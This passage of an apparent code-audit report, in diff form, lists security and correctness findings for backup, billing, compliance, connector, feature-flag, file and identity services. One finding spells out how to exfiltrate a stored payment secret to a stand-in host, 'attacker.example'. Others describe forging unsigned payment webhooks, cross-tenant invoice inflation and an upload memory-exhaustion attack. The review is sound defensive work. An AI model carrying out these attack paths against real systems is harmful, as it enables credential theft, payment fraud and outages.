+          "detail": "_check_host only enforces when the allowlist is non-empty: `if allowed_hosts and host not in allowed_hosts`. EGRESS_ALLOWED_HOSTS defaults to '' (config.py:349) so egress_allowed_hosts is an empty frozenset and the host check is skipped entirely — every outbound call (backup export/import to a target, alert webhook) may reach any host. Combined with target registration (POST /internal/backup/targets, default-open internal policy) an attacker sets base_url to a host they control and token_ref to the NAME of an existing stored operator secret; token_resolver resolves that secret's plaintext (secret_store.get) and post_json sends it as the X-Internal-Token header to the attacker host. No scheme restriction either (urllib), so file:// and similar are reachable on operator/registry-set URLs.",
+          "failure_scenario": "Holder of the shared internal token (or platform.backup operator) POSTs /internal/backup/targets {service:'x', base_url:'http://attacker.example', token_ref:'TAP_SECRET_KEY'} then POSTs /internal/backup/run. With the default empty allowlist, backup-service resolves TAP_SECRET_KEY and POSTs it in the X-Internal-Token header to attacker.example — plaintext payment credential exfiltrated. The comment claims the allowlist 'makes the destination a decision an operator made', but the shipped default disables it."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/orchestrator.py",
+          "line": 177,
+          "title": "Run/restore/drill ids use second-granularity timestamps — two operations in the same second collide and overwrite",
+          "detail": "run_id = f\"run_{self._iso().replace(':','').replace('-','')}\" where iso() is '%Y-%m-%dT%H:%M:%SZ' (whole seconds). Same pattern for restore_id (restore.py:133), undo_id (restore.py:247) and drill ids (drill.py:74). Archive object keys are '{run_id}/{service}.json' (orchestrator.py:113) and records are stored by id (RunStore.record put by id). Two runs starting in the same second produce the same id, so the second run's archives overwrite the first's object keys and RunStore.record overwrites the first run record.",
+          "failure_scenario": "An operator triggers an out-of-band run (POST /backup/run) in the same second a cron-scheduled run fires. Both build id run_20260912T031500Z; the second put overwrites the first run's record and its per-service archive objects, silently merging/destroying one run's results and leaving dangling references — the exact 'a miss is never dropped' honesty guarantee is broken by a lost run record."
+        }
+      ]
+    },
+    {
+      "service": "billing-service",
+      "issues": [
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "app/core/billing_service.py",
+          "line": 1238,
+          "title": "Cross-tenant usage injection inflates a victim tenant's overage invoice",
+          "detail": "POST /api/v1/billing/usage (app/api/v1/billing.py:999) is guarded only by _SELF and records the raw body.subscription_id with record_usage(tenant=_tenant(principal), subscription_id=body.subscription_id, ...) — billing_service.record_usage (line 1011) and UsageStore.record (app/core/stores.py:613) never verify that subscription_id belongs to the caller's tenant. run_overage() then computes billable units via UsageStore.aggregate(sub.id, metric, ...) (line 1238 / stores.py:619) which filters ONLY on subscription_id+metric, with NO tenant scoping. So any authenticated shop user can post large usage against another tenant's subscription id and metric; those rows are summed into the victim's overage and charged to the victim's payment token.",
+          "failure_scenario": "Tenant A (any billing.self token) calls POST /usage with subscription_id=<tenant B's sub_id>, metric=<B's usage_metric>, quantity=1000000. When B's period-end run_overage executes, aggregate() sums A's injected rows, over>0, and B is charged net = over * overage_minor + VAT for usage B never incurred."
+        },
+        {
+          "category": "bug",
+          "severity": "high",
+          "file": "app/core/billing_service.py",
+          "line": 2121,
+          "title": "refund() has no idempotency/status guard — repeat calls double-refund and over-refund",
+          "detail": "refund(payment_id, amount_minor) fetches the payment and immediately calls gw.refund(...) without checking pay.status (an already-'refunded' payment is refunded again) and without bounding amount_minor against inv.total_minor - inv.refunded_minor. On each ok charge it does inv.refunded_minor = (inv.refunded_minor or 0) + refund_amt and records a negative ledger row. POST /payments/{payment_id}/refund (app/api/v1/billing.py:1218) is a plain _ADMIN call with no dedupe, so two clicks / retries move real money twice and drive refunded_minor and the ledger past the amount originally charged.",
+          "failure_scenario": "Admin (or a retried request) calls refund twice on the same payment: gw.refund executes both times, money is returned twice, inv.refunded_minor exceeds total_minor, and two negative ledger 'refund' rows are written. Passing amount_minor > outstanding is likewise unbounded."
+        },
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "app/core/billing_service.py",
+          "line": 1981,
+          "title": "Webhook signature verification fails open when no webhook secret is configured",
+          "detail": "handle_webhook builds candidates=(secret,) and, when the resolved secret is empty (a tenant/deployment with no PAYMENT_WEBHOOK_SECRET set), passes candidate='' to the adapters. The adapters treat an empty secret as valid: moyasar.verify_webhook (app/adapters/payment/moyasar.py:84) does constant_eq(payload.secret_token, secret or self._whsec) → constant_eq('','')==True; checkout.verify_webhook (app/adapters/payment/checkout.py:60) computes hmac_sha256_hex(secret or self._whsec='', body) which an attacker can reproduce with an empty key. There is no fail-closed guard rejecting an empty configured secret, so a forged, unsigned webhook verifies and, with a known provider_id, drives _apply_outcome→_mark_paid to mark an invoice paid.",
+          "failure_scenario": "For a tenant with no webhook secret configured, an attacker POSTs /internal/billing/webhook/moyasar with a JSON body whose data.id is a known pending payment's provider_id and type=payment_paid (no valid secret_token needed). verify returns verified=True and the invoice is marked paid without any money moving."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/billing_service.py",
+          "line": 793,
+          "title": "Duplicate wallet top-up request double-credits the wallet for a single charge",
+          "detail": "wallet_topup() uses only a gateway-level idempotency key (topup:{tenant}:{payment_token}:{total}) and creates a brand-new invoice + grant per call. On a duplicate/retried request the gateway dedupes the actual charge and returns ok, but a SECOND Invoice (new id) is saved and _mark_paid records a SECOND grant keyed by that new invoice_id. Grants are idempotent by invoice_id, so the two distinct invoice ids yield two separate credits to the fund while the customer was charged once — the platform hands out double prepaid credit.",
+          "failure_scenario": "A user double-submits POST /api/v1/billing/wallet-topups with the same payment_token and amount. Gateway charges once (same idempotency_key), but two paid invoices and two grant outbox rows are produced, crediting the wallet fund twice for one payment."
+        }
+      ]
+    },
+    {
+      "service": "compliance-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/erasure.py",
+          "line": 71,
+          "title": "DSAR erasure deletes consent rows under the raw purpose key, not the normalized key, so records survive while the ack reports them erased",
+          "detail": "ConsentStore stores every consent under _key = f\"{tenant}::{subject}::{normalise(purpose)}\" (casefold + strip), and the stored row's `purpose` field keeps the RAW value. ComplianceErasure.erase() reads rows via find() and deletes with f\"{tenant}::{subject}::{r.get('purpose','')}\" — the RAW purpose, i.e. the legacy key. For any purpose containing uppercase letters or surrounding whitespace (e.g. 'Marketing', ' analytics '), delete targets a key that does not exist and the consent record is NOT removed. Worse, `erased` is appended as `consent:{len(rows)}` whenever find() returned rows (line 72-73) regardless of whether delete actually removed anything, and `already_absent` is computed as `not erased` — so the erase ack asserts the consent was deleted when it still sits in the store. This is the exact 'false completion' the service is designed to prevent, on the /internal/privacy/erase path invoked during every DSAR erasure fan-out. Contrast retention.py:_purge which deletes row['id'] (the canonical stamped key) and works correctly.",
+          "failure_scenario": "A subject consented to purpose 'Marketing'. An erasure DSAR fans out to compliance-service. erase() finds the consent row, calls delete('consent','tenant::subj::Marketing'), but the row lives at 'tenant::subj::marketing'; delete is a no-op. The ack returns erased=['consent:1'], the DSAR target flips to acked and the request completes 'successfully', yet the marketing consent record is still present and check() will keep returning allowed=True for it."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/consent_sweeper.py",
+          "line": 147,
+          "title": "Lapse-announcement flag is written back under the raw purpose key, breaking idempotency and re-emailing guardians every run",
+          "detail": "ConsentSweeper._announce() sets row['lapsed_announced']/['lapsing_announced'] then persists with store.put('consent', f\"{tenant}::{subject}::{purpose}\", row) using the RAW purpose. But the canonical row is stored under normalise(purpose) (and _derive_lapse's own write-back at stores line/sweeper line 78 correctly uses ConsentStore._key). For any purpose with uppercase/whitespace, the flag lands on a NEW legacy-key duplicate row while the canonical row still has no flag. On the next run, scan_all() re-reads the unflagged canonical row and announces the lapse again — every night — which is precisely the 'repeatedly telling a guardian their child's consent is ending' outcome the docstring calls worse than telling them late. It also leaves a duplicate consent row that ConsentStore.get()'s legacy fallback can surface.",
+          "failure_scenario": "A guardian consent for purpose 'Newsletter' crosses the age of majority. Each nightly sweep announces consent.lapsed for it because the lapsed_announced flag is persisted to key 'tenant::subj::Newsletter' while the live row is at 'tenant::subj::newsletter'; the guardian receives a lapse email every night indefinitely, and a stale duplicate consent row accumulates."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/backup.py",
+          "line": 196,
+          "title": "Restore-as-clone (into_tenant) silently loses consent and legal records because their datastore key embeds the original tenant in row['id']",
+          "detail": "import_archive() with into_tenant remaps only row['tenant'] (line 199) then rebuilds the datastore key via _row_key(template, ...). For consent, legal_documents and legal_current the backup key template is the default '{id}', and those ids are the CANONICAL composite keys stamped at write time ('tenant::subject::purpose', 'tenant::doc_id::version', 'tenant::doc_id') which embed the ORIGINAL tenant. Remapping the tenant field does not change row['id'], so the clone writes each row back under its original-tenant key, not the destination tenant's key. With overwrite=False the original rows already occupy those keys, so every consent / legal-page row is counted as 'skipped' and nothing is restored for the new tenant; the cloned tenant's own scoped reads (which compute 'newtenant::...') find none of them. The clone therefore silently omits exactly the legal records (consent proof-of-lawful-basis, accepted legal versions) this service exists to preserve.",
+          "failure_scenario": "An operator clones tenant A's compliance data into a fresh tenant B via backup import with into_tenant='B'. DSARs and holds (uuid ids) restore fine, but every consent row and legal document is written under 'A::...' keys, skipped as already-existing, and invisible under tenant B — B ends up with no consent records or accepted-terms history, while the import result reports success."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/api/v1/compliance.py",
+          "line": 305,
+          "title": "Platform compliance officers can discover cross-tenant DSARs but cannot verify or process them (no tenant param), risking missed statutory deadlines",
+          "detail": "list_dsar() gives a platform.compliance operator a cross-tenant open-DSAR discovery view (list_all_open). But verify_dsar() (line 306) and process_dsar() (line 318) take no tenant/body parameter and scope the action with _tenant(principal), which for a platform operator with no body returns body_tenant or p.tenant or 'global'. DsarService.verify()/process() then apply `(tenant and d.tenant != tenant)` and return NOT_FOUND for any DSAR whose tenant differs from the operator's own reserved tenant. So an officer who discovers another shop's open erasure/access request through the very cross-tenant view built for them cannot verify or process it — the request cannot be advanced past its PDPL clock through the platform surface.",
+          "failure_scenario": "A platform compliance officer sees shop X's overdue erasure DSAR via GET /dsar (cross-tenant view), then POSTs /dsar/{id}/process. _tenant() resolves to the officer's own tenant ('global'), d.tenant is shop X, so process() returns NOT_FOUND and the erasure is never driven; the DSAR runs past its statutory deadline with no way for the officer to act on it."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/adapters/datastore/postgres.py",
+          "line": 189,
+          "title": "Numeric sort fields (created_at/placed_at) are ordered as TEXT, so 'oldest-first' sweeper/officer views are mis-ordered",
+          "detail": "find() orders by COALESCE(value->>'{field}','') as text and the keyset cursor comparison (line 182) is likewise a text tuple. The DSAR/hold 'oldest-first' views (open_dsars, active_all) sort on created_at/placed_at, which are JSON floats rendered as strings. Lexicographic ordering of stringified epoch floats does not match numeric order (e.g. '1700000000.0' sorts before '999999999.0', and differing fractional widths reorder ties), so 'oldest-first — the ones nearest their PDPL deadline are retried first' is not actually honored. Pagination itself is self-consistent (same expression in ORDER BY and cursor) so no rows are dropped, but the priority ordering the sweeper and the compliance-officer view rely on is wrong.",
+          "failure_scenario": "The erasure sweep and the cross-tenant open-DSAR officer view claim to surface the oldest/nearest-deadline requests first; because created_at is compared as text, a newer request can be returned ahead of an older one, so under a per-run cap the genuinely oldest DSAR can be deprioritized rather than retried first."
+        }
+      ]
+    },
+    {
+      "service": "connector-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/sync_engine.py",
+          "line": 46,
+          "title": "Idempotency key collapses to one value for records lacking a source id, silently dropping records on push",
+          "detail": "_idem_key returns f\"{conn_id}:{resource}:{source_id}\" where source_id = record.get('id') or record.get('vid') or record.get('_id') or ''. Any record without one of those keys produces the SAME key `cn:res:`. In push() (lines 173-176) the first such record is sent and marked seen; every subsequent record without an id then hits `if await self._seen.seen(key): skipped += 1; continue` and is silently skipped. The same collapse affects pull() dedup. Records that legitimately have no top-level id (nested-id objects, arrays of value rows) are dropped, not synced, with no error surfaced to the caller.",
+          "failure_scenario": "push a batch of 5 CRM notes that carry their id under `noteId` (not id/vid/_id). Record 1 is pushed; records 2-5 share key `cn:notes:` which is now marked seen, so they are counted `skipped` and never delivered. Response reports success with skipped=4; four records are permanently lost."
+        },
+        {
+          "category": "bug",
+          "severity": "high",
+          "file": "app/core/sync_engine.py",
+          "line": 132,
+          "title": "A single unmappable record permanently blocks the pull watermark (poison-pill stall) and re-duplicates DLQ every attempt",
+          "detail": "In pull(), the watermark only advances when `failed == 0` (lines 132-136), and any mapping exception increments `failed` and dead-letters the record (lines 116-121). Successfully mapped records are marked seen, but the failed record is not. On the next run the same page is re-fetched (watermark unchanged), the good records are seen-skipped, and the still-broken record fails again and is added to the DLQ with a NEW dlq id each time (line 118 new_id). So one permanently-unmappable record (bad field_map, malformed provider field) freezes ALL further progress for that resource forever and grows the DLQ without bound on every retry. push() handles this correctly (dead-letter and continue); pull() does not.",
+          "failure_scenario": "provider page 1 contains one record whose mapped field raises in _mapping.apply. failed=1 forever, so conn.watermarks[resource] never advances past page 1. Every scheduled sync re-reads page 1, re-DLQs that record (duplicate rows accumulate), and the tenant never receives pages 2..N — a silent, unrecoverable sync outage for that resource."
+        },
+        {
+          "category": "perf",
+          "severity": "high",
+          "file": "app/core/sync_engine.py",
+          "line": 180,
+          "title": "push() runs the blocking provider HTTP call on the event loop",
+          "detail": "pull() deliberately offloads the blocking provider call with `await asyncio.to_thread(self._provider.fetch, ...)` (line 91) precisely because the provider adapter does synchronous urllib I/O. push() calls `self._provider.push(...)` directly (line 180) with no to_thread. Each pushed record makes a synchronous outbound HTTP round-trip (oauth2_rest.push -> post_json -> urllib) that blocks the single-worker event loop for its full duration, freezing every other coroutine (including /healthz) — the exact crash-loop class documented in the project's 'blocking sync in async' memory. A push of N records serially blocks the loop for N round-trips.",
+          "failure_scenario": "a push batch of 100 records against a slow provider (500ms each) blocks the event loop for ~50s; liveness/readiness probes fail and the pod is killed mid-batch."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/core/token_manager.py",
+          "line": 134,
+          "title": "Token refresh performs blocking provider HTTP on the event loop while holding the single-flight lock",
+          "detail": "_refresh_single_flight acquires the process-wide asyncio.Lock for the connection (line 114-115) then calls `self._provider.refresh(refresh_token=..., spec=spec)` synchronously (line 134). refresh() does blocking urllib I/O (oauth2_rest -> post_form -> urllib). Because it is not wrapped in asyncio.to_thread, the entire event loop is blocked for the full token-endpoint round-trip, AND the lock serializes it — so a slow OAuth token endpoint stalls the whole worker on every credential refresh. Contrast with pull()'s explicit to_thread offload for the same class of call.",
+          "failure_scenario": "an expiring token triggers refresh against a token endpoint that takes 3s; the event loop is frozen for those 3s, all concurrent requests stall, and health probes may fail."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/stores.py",
+          "line": 97,
+          "title": "SeenStore idempotency is a non-atomic check-then-set, allowing double-processing under concurrent runs",
+          "detail": "SeenStore.seen() (get) and mark() (put) are two separate datastore operations with no atomic compare-and-set. sync_engine push (lines 174-182) and pull rely on `if seen(): skip else process; mark`. Two concurrent syncs of the same connection/resource (e.g. job-service retry overlapping a manual /api/v1/connectors/sync, or two replicas) can both observe the key as not-seen and both call provider.push for the same record, defeating the stated at-least-once/no-double-write guarantee. There is no per-connection concurrency guard on the sync routes either.",
+          "failure_scenario": "job-service's scheduled push and an operator-triggered push run within the same window; both pass seen(key)==False for record R and both POST it to the provider, creating a duplicate downstream record despite the Idempotency-Key header being provider-dependent."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/sync_engine.py",
+          "line": 142,
+          "title": "Client-side mapping failures trip the provider circuit breaker",
+          "detail": "In pull(), when records fail during local field-map application, the code calls `_record_failure(conn, state, 'map_failures')` (line 142), which increments conn.consecutive_failures and, at threshold, opens the circuit (circuit.on_failure). A malformed field_map is a tenant configuration error, not a provider outage, yet it drives the per-connection circuit breaker to OPEN, after which can_attempt() returns False and ALL further syncs for that connection are skipped with reason 'circuit_open' (lines 80-81). A configuration mistake thus disables a healthy connection.",
+          "failure_scenario": "a tenant saves a spec whose field_map path is wrong; five sync runs each record map_failures, the circuit opens, and subsequent syncs are refused for CIRCUIT_RESET_SECONDS even though the provider is fully reachable."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/sync_engine.py",
+          "line": 124,
+          "title": "pull() marks records 'seen' and advances the watermark before the caller has durably received them (at-most-once delivery)",
+          "detail": "pull() commits idempotency marks (lines 124-125) and advances conn.watermarks (lines 132-133) before returning the records in the HTTP response body (lines 145-146). If the response is lost in transit and the caller retries the same pull, the watermark has already advanced and the records are seen-marked, so they are neither re-fetched nor re-returned — they are lost to the caller. This contradicts the module docstring's claim that the watermark 'advances only after the batch is durably processed'; for pull, 'processed' means only 'returned', which is not durable at the consumer.",
+          "failure_scenario": "engine.pull returns page 1 (watermark now at cursor2) but the network drops the HTTP response; the caller retries, receives page 2, and page 1's records are permanently skipped — silent data loss."
+        }
+      ]
+    },
+    {
+      "service": "feature-flag-service",
+      "issues": [
+        {
+          "category": "perf",
+          "severity": "high",
+          "file": "app/core/flag_service.py",
+          "line": 209,
+          "title": "Blocking synchronous entitlement HTTP call on the async hot evaluation path freezes the event loop",
+          "detail": "FlagService._entitled() calls self._ent.allowed(...) synchronously inside the async _resolve(). For the billing driver (BillingHttpEntitlement.allowed at app/adapters/entitlement/billing_http.py:25) this runs app/adapters/flag_http.py get_json -> urllib.request.urlopen with TIMEOUT=10 (flag_http.py:26). It is NOT offloaded via asyncio.to_thread/run_in_threadpool, so it blocks the single-worker event loop for up to 10s on the platform's highest-QPS path. This is the exact bug class the audit sink was already fixed for (audit_sink/http.py wraps urlopen in asyncio.to_thread; MEMORY 'Blocking sync in async'). The entitlement result is also not cached, so every evaluation of an entitlement-gated flag re-issues the blocking call, and evaluate_all() (flag_service.py:230) multiplies it by one blocking call per gated flag in the catalogue.",
+          "failure_scenario": "A tenant has an entitlement-gated flag and billing-service is slow/unreachable. A single POST /flags/evaluate (or /internal/flags/evaluate) with billing latency at the 10s timeout blocks the event loop for 10s per gated flag, stalling ALL concurrent requests (including /healthz) on that worker; evaluate_all with N gated flags serializes N such blocking calls in one request."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "app/api/v1/flags.py",
+          "line": 176,
+          "title": "user-scope overrides are not tenant-restricted while tenant-scope overrides are, letting a non-platform admin override any user cross-tenant",
+          "detail": "In set_override (flags.py:177-179) and clear_override (flags.py:197-199) the code deliberately clamps subject to the caller's own tenant for scope=='tenant' unless the caller holds 'platform.flags'. No equivalent restriction exists for scope=='user': any holder of flags.manage may set/clear an override for an ARBITRARY user id on a globally-shared flag. The presence of the tenant guard shows overrides are meant to be tenant-scoped for non-platform admins, so the missing user guard is an authorization gap. (Related: archive_flag, upsert_flag, put_config and set_maintenance require only _ADMIN=flags.manage with no tenant scoping at all, so a tenant-level flags.manage admin can also globally kill flags / mutate global config.)",
+          "failure_scenario": "A tenant admin holding flags.manage (no platform.flags) calls POST /flags/{key}/overrides with scope=user, subject=<a user id belonging to another tenant>, value=true — the override is accepted and applied to the shared flag, changing that other user's evaluation."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/stores.py",
+          "line": 112,
+          "title": "ConfigStore.put increments the version with a non-atomic read-modify-write, losing a config version under concurrency",
+          "detail": "put() reads the head (get _CONFIG), computes version = head.version + 1, then writes both _CONFIG_VERSIONS[key::env::version] and the head. There is no CAS/optimistic-concurrency check and the datastore put is last-writer-wins (memory.py put / postgres.py INSERT..ON CONFLICT DO UPDATE). Two concurrent puts (or a client retry racing the original) both read version N, both compute N+1, and both write to the SAME _CONFIG_VERSIONS key N+1 — one silently overwrites the other. This breaks the documented append-only/'never rewrites history' invariant and loses a config change while the caller receives a 200.",
+          "failure_scenario": "Two admins (or one admin's retried request) PUT /config/{key} concurrently: both read head version 3, both write config_versions key '<key>::<env>::4'; the second clobbers the first. History shows a single version 4 holding only one of the two values; the other change is lost with no error."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/core/flag_service.py",
+          "line": 121,
+          "title": "Flag override/upsert use whole-document read-modify-write with no CAS, dropping concurrent writes",
+          "detail": "set_override/clear_override/upsert/archive all do store.get(flag) -> mutate the dataclass -> store.save(flag) (flag_service.py:121-145, 91-119) over FlagStore.save which is an unconditional put (stores.py:26-28). There is no version/etag check, so two concurrent writes to the same flag are last-writer-wins over the ENTIRE flag document: e.g. one admin adds a user override while another edits rollout_pct — whichever saves last discards the other's change, including silently reverting an override just added by a concurrent request.",
+          "failure_scenario": "Admin A POSTs an override for user X and admin B PUTs a new rollout_pct on the same flag at the same time. Both read the same base row; B saves last, so A's override is dropped (or vice versa) with a 200 returned to both."
+        },
+        {
+          "category": "security",
+          "severity": "low",
+          "file": "app/api/v1/flags.py",
+          "line": 206,
+          "title": "POST /flags/evaluate accepts an arbitrary tenant/user context with no scoping to the principal",
+          "detail": "The evaluate route requires only _READ (flags.read) and takes body.tenant/body.user verbatim (flags.py:207-212). The principal's tenant is never used to constrain the evaluation context, so any flags.read holder can evaluate flags as any tenant/user and observe that tenant's decisions — including whether a tenant/user override exists (the reason field returns 'tenant_override'/'user_override'). This is a minor cross-tenant information disclosure through the debug reasons.",
+          "failure_scenario": "A caller with flags.read for tenant A sends {tenant: 'B', user: 'someone'} and reads back reason='tenant_override' / variant assignment, inferring another tenant's targeting configuration and override membership."
+        }
+      ]
+    },
+    {
+      "service": "file-service",
+      "issues": [
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "services/file-service/app/api/v1/files.py",
+          "line": 102,
+          "title": "Chunked upload with no Content-Length bypasses all size limits and is buffered whole in memory (DoS)",
+          "detail": "The inline upload route guards size only when a Content-Length header is present: files.py:99-101 checks `declared_len` before reading, and BodyLimitMiddleware (middleware/security.py:71-81) also only inspects `content-length`. A request using chunked transfer-encoding (no Content-Length) skips both guards, and `data = await request.body()` (files.py:102) then reads the ENTIRE body into memory before the only remaining check `len(data) > self._max` in FileService.upload (file_service.py:235). Nothing streams or bounds the read up front.",
+          "failure_scenario": "An authenticated caller holding files.upload sends `POST /api/v1/files` with `Transfer-Encoding: chunked` and no Content-Length, streaming multi-GB of data. Both size guards are skipped; the process buffers the whole body in RAM (bounded only by the 30s request timeout), exhausting memory and OOM-killing the pod."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "services/file-service/app/api/v1/files.py",
+          "line": 203,
+          "title": "List-files endpoint requires no files.read capability, unlike single-file metadata",
+          "detail": "`GET /api/v1/files` (list_files) declares only `dependencies=[Depends(rate_limit)]` and takes `principal=Depends(require_user)` — so any valid token, even one with an EMPTY caps set, can enumerate its tenant's file records. By contrast `GET /{file_id}/metadata` and `GET /{file_id}` are gated by `Depends(_READ)` (require_capability('files.read')). The same data (filenames, sizes, sha256, owners) is thus reachable in bulk without the capability that guards it per-file, contradicting the service's deny-by-default RBAC stance (authz.py).",
+          "failure_scenario": "A principal issued a token with `caps=[]` (no capabilities) calls `GET /api/v1/files`; it returns the full paged metadata of every file in its tenant, even though `GET /api/v1/files/{id}/metadata` would 403 the same principal."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "services/file-service/app/core/file_service.py",
+          "line": 111,
+          "title": "Large-upload dedup increments ref-count without re-storing bytes, racing blob deletion (data loss)",
+          "detail": "The delete path's safety argument (file_service.py:274-280) relies on the invariant 'upload writes the blob before it increments, so a re-upload has already restored the bytes.' The large-upload dedup short-circuit violates that invariant: begin_large_upload finds an existing owned file (first_by_owner_sha) and calls `incr_ref(sha)` + creates a new FileObject WITHOUT any store.put of the bytes (file_service.py:111-117). If a concurrent delete of the referencing file runs `decr_ref`->0, then `claim_blob_delete` (del_if_zero removes the ref row) and `store.delete(sha)` in the window after the dedup read but before/around its incr, the new FileObject ends up referencing a blob that was physically deleted.",
+          "failure_scenario": "Owner A has file X referencing blob S (ref=1). Concurrently: (1) A deletes X -> decr to 0, del_if_zero succeeds, store.delete(S) runs; (2) A calls POST /uploads with sha=S -> dedup sees X, incr_ref(S) recreates the ref row at 1 and creates file Y. Result: Y references S but the object bytes are gone; every download of Y 404s and the bytes are unrecoverable."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/file-service/app/core/file_service.py",
+          "line": 114,
+          "title": "Dedup path records client-declared size unverified against the actual blob",
+          "detail": "In the begin_large_upload dedup branch, the new FileObject is built with `size=size` and `content_type=ct` taken directly from the client's InitiateIn body (file_service.py:114-116), and returned as a completed file. Unlike the finalize path, the bytes are never re-hashed or head-checked here, so the stored metadata size/content_type is whatever the caller claimed, independent of the real content behind the sha256.",
+          "failure_scenario": "A caller who already possesses blob S calls POST /uploads with the correct sha256 but a fabricated `size` (e.g. 1) and a mismatched content_type; the service returns/stores a FileObject asserting that wrong size/type for real content, corrupting any downstream accounting or quota that trusts the metadata."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/file-service/app/core/upload_session.py",
+          "line": 138,
+          "title": "find_stale_pending sweeps only PENDING despite claiming pending/scanning; SCANNING sessions can orphan",
+          "detail": "The docstring says it returns 'Pending/scanning sessions older than before_iso', but the query filters `{\"status\": PENDING}` only (upload_session.py:142). sweep_stale_sessions (file_service.py:200-219) therefore never releases a session stuck in SCANNING. Such a session is normally rescued by the scan queue's reclaim, but if its queue job is lost (e.g. finalize crashes after the job is popped/acked, or a malformed job is acked and discarded in scan_worker.run_once:100-105), nothing sweeps it and its staging object/multipart lingers indefinitely.",
+          "failure_scenario": "A large upload reaches SCANNING, its scan job is acked but finalize fails before promotion; the session remains SCANNING forever, the staging object and multipart parts are never released, and the TTL sweeper skips it because it only matches PENDING."
+        },
+        {
+          "category": "security",
+          "severity": "low",
+          "file": "services/file-service/app/api/v1/files.py",
+          "line": 249,
+          "title": "User signed-url route records file.signed_url_issued before the access check, logging issuance that never happened",
+          "detail": "The user-facing signed_url handler records the `file.signed_url_issued` audit event (files.py:249-251) BEFORE calling `_load_scoped` (files.py:253), which 404s when the file does not belong to the caller's tenant. On a denied request no token is returned to the caller, yet the audit trail already asserts a URL was issued for that file_id. This pollutes the trail with false issuance records and lets an unauthorized caller generate audit entries for arbitrary file_ids by probing.",
+          "failure_scenario": "A principal calls POST /api/v1/files/{random_or_other_tenant_id}/signed-url; the request 404s (no URL returned) but an audit row claims the caller was issued a signed URL for that file_id, misrepresenting what occurred and enabling audit-log spam."
+        }
+      ]
+    },
+    {
+      "service": "identity-service",
+      "issues": [
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "app/core/erasure.py",
+          "line": 102,
+          "title": "DSAR erase of a Person uses display() instead of normalize(), so PII survives a right-to-erasure request",
+          "detail": "IdentityErasure._erase_person computes `ident = self._identifier.display(subject)` and then calls `self._memberships.person_by_identifier(ident)`. But the person index (persons_by_identifier) is keyed on the NORMALIZED identifier: create_person stores `_PERSON_INDEX[p.identifier]` where p.identifier = identifier.normalize(...) (see auth_service.add_member which sets `ident = self._identifier.normalize(identifier)` before creating the Person, and MembershipStore.person_by_identifier does a raw store.get with no normalization). display() only strips whitespace for the email adapter (returns original case), and for the composite adapter display() returns the sub-adapter's display WITHOUT the `email:`/`phone:` type prefix that normalize() prepends. So the lookup key never matches the index key. The Person row — identifier, password_hash, mfa_secret — and its identifier index are therefore NOT deleted, while erase() still returns a success receipt reporting the membership erased. This defeats the entire purpose of the erasure path (identity owns the pseudonym linkage), leaving the most sensitive record intact after a completed DSAR.",
+          "failure_scenario": "Multi-tenant (composite login) deployment: person registered as `email:alice@x.com` in the index. Compliance calls POST /internal/privacy/erase {tenant, subject:'alice@x.com'}. _erase_person looks up person_by_identifier('alice@x.com') but the index key is 'email:alice@x.com' -> returns None -> Person (identifier, password hash, MFA secret) is retained; receipt claims membership erased and retained:[] -- silent PII retention. Same failure for any mixed-case email (display 'Alice@X.com' vs index 'alice@x.com') even with a plain email identifier."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/adapters/datastore/postgres.py",
+          "line": 33,
+          "title": "Keyset ordering index is on value->>'created' but membership queries ORDER BY value->>'created_at' — every tenant member scan bypasses the index",
+          "detail": "The shipped btree index kv_created_desc is `(collection, COALESCE(value->>'created','') DESC, key DESC)`. find() builds its ORDER BY / cursor comparison from the caller's sort field. MembershipStore.members(), founding_owner(), has_other_active_owner() and memberships() all pass sort=('created_at', ...) because Membership.to_dict()/Person.to_dict() store the timestamp under `created_at`, not `created`. Postgres cannot use an index on `value->>'created'` to satisfy `ORDER BY COALESCE(value->>'created_at','')`, so each of these queries degrades to a Bitmap Heap Scan over all of the tenant's membership rows plus a Sort — exactly the O(tenant-rows) behaviour the module docstring says the matched index exists to avoid (its own measurement: 3.44ms mismatched vs 0.92ms matched). Correctness is unaffected (the ORDER BY and cursor use the same field consistently), but member-directory pagination, the sole-owner guard, and founding-owner lookups all pay a full per-tenant scan. Service accounts (sort=('created',...)) match the index; the membership/person collections do not.",
+          "failure_scenario": "A tenant with tens of thousands of members: GET /api/v1/tenancy/members (or the internal sweep) and every remove_member/set_member_status call (which invoke has_other_active_owner) bitmap-scan and top-N sort the whole tenant's membership set per page instead of an index seek, so latency grows with the tenant's size rather than the page size."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/core/otp_service.py",
+          "line": 103,
+          "title": "OTP verify attempt counter is read-modify-write with no atomicity, allowing brute-force amplification under concurrency",
